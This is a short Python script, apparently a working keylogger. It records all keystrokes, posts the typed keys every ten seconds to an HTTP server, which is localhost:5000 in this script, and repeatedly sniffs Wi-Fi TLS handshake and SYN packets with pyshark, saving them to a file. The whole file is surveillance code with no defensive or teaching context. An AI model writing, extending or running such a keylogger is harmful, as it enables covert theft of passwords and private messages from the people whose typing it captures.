import keyboard
import requests as rq
from time import time
import threading
import pyshark

server = "http://localhost:5000"

def sendKeyLog(record):
    recordlist = ""
    for item in record:
        if item.event_type == "down":
            recordlist += item.name
    rs = rq.post(server + "/key", recordlist.encode('utf-8'))

def sniff():
    capture = pyshark.LiveCapture(interface="WiFi", bpf_filter="tcp dst port 443 and ((tcp[((tcp[12] & 0xf0) >> 2)] = 0x16) or (tcp[13] & 0x02 = 2))")
    print("capture set")
    capture.sniff(timeout=10)
    print("sniffing...")
    packets = [packet for packet in capture._packets]
    capture.close()
    print("capture closed")
    print(f"Packet count: {len(packets)}")
    with open("text.txt", "w") as f:
        for packet in packets:
            f.write(str(packet) + "\n")

def main():
    count = 0
    ts = time()
    keyboard.start_recording()
    sniff()
    while True:
        dt = time()
        if dt - ts > 10:
            record = keyboard.stop_recording()
            sendKeyLog(record)
            ts = time()
            keyboard.start_recording()
            sniff()
            
        
if __name__=="__main__":
    main()
